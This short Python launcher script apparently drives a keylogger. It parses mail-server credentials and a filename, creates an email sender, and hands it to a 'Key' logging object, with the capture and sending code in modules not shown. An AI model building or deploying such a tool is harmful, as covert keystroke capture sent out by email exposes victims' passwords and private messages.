#!/bin/python3

import threading

from log_to_file import Key
from send_email_using_python import Send_Email
from parser import Parser

def main():

    arguments = Parser.parse_arguments()
    f = Send_Email(arguments["server"], arguments["port"],\
                   arguments["sender"], arguments["password"],\
                   arguments["filename"])


    k = Key(arguments["filename"])
    k.some_f(f)

if __name__ == '__main__':
    main()
